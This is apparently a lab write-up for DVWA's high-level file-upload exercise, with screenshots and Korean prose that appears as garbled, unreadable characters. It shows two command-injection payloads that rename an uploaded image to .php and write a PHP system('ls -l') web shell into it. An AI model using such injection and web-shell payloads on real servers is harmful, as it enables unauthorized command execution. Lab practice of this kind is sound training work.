# File Upload (HIGH)

## Ǯ��

![fileupload_high_1](../img/fileupload_high_1.png)

�� ���� ���� ������ jpeg�� png ���ϸ� �ް� �뷮�� ������ �ִ�.

�׷��� hello.png ��� �� ��� �׸��� upload ���״�.
��

![fileupload_high_2](../img/fileupload_high_2.png)

�� ������ �ٸ� ������� ���� �����ؾ��Ѵ�.

command inject LOW �ܰ�� ���� �Ʒ��� ��ɾ���� �Է½��� hello.png �� �̸��� hello.php �� �ٲٰ� php ��ɾ ���� �Է½��״�.

```
0.0.0.1 & mv ../../hackable/uploads/hello.png ../../hackable/uploads/hello.php
0.0.0.1 & echo ^<?php system("ls -l") ?^> > ../../hackable/uploads/hello.php
```

![fileupload_high_3](../img/fileupload_high_3.png)

�׸��� ó���� Ȯ���� ��ġ���� hello.php �� Ȯ���� ���Ҵ�. ���������� ��ɾ ����� ���� Ȯ���� �� �־���.